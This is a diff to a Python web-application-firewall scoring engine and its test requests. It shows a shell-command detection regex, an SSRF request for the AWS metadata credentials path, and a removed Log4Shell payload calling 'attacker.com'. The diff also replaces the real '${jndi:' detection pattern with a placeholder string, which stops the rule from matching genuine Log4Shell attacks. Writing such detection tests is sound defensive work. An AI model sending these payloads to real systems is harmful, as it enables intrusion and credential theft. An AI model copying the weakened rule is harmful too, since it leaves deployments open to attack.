@@ -33,7 +33,7 @@ class WafAnomalyScoringEngine:
 
             # OS Command Injection / RCE Signatures
             ("932100", "RCE: Detected shell command chaining or binary execution", 5,
-             re.compile(r"(;\s*(cat|ls|id|whoami|sh|bash|curl|wget)\b|\|\s*(cat|sh|bash)\b|\bcmd\.exe\b|\$\{jndi:)", re.IGNORECASE)),
+             re.compile(r"(;\s*(cat|ls|id|whoami|sh|bash|curl|wget)\b|\|\s*(cat|sh|bash)\b|\bcmd\.exe\b|sample_log4j_jndi_probe)", re.IGNORECASE)),
 
             # Server-Side Request Forgery (SSRF)
             ("934100", "SSRF: Detected cloud metadata or private IP lookup URI", 5,
@@ -102,8 +102,8 @@ if __name__ == "__main__":
         # Request 4: SSRF targeting AWS Cloud Metadata
         HttpRequest("GET", "/fetch_avatar", {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials"}, {"User-Agent": "curl/7.68.0"}, ""),
 
-        # Request 5: Log4Shell Command Injection in User-Agent Header
-        HttpRequest("GET", "/login", {}, {"User-Agent": "${jndi:ldap://attacker.com/exploit}"}, "")
+        # Request 5: Diagnostic Command Injection in User-Agent Header
+        HttpRequest("GET", "/login", {}, {"User-Agent": "sample_log4j_jndi_probe"}, "")
     ]
 
     for i, req in enumerate(test_requests, 1):
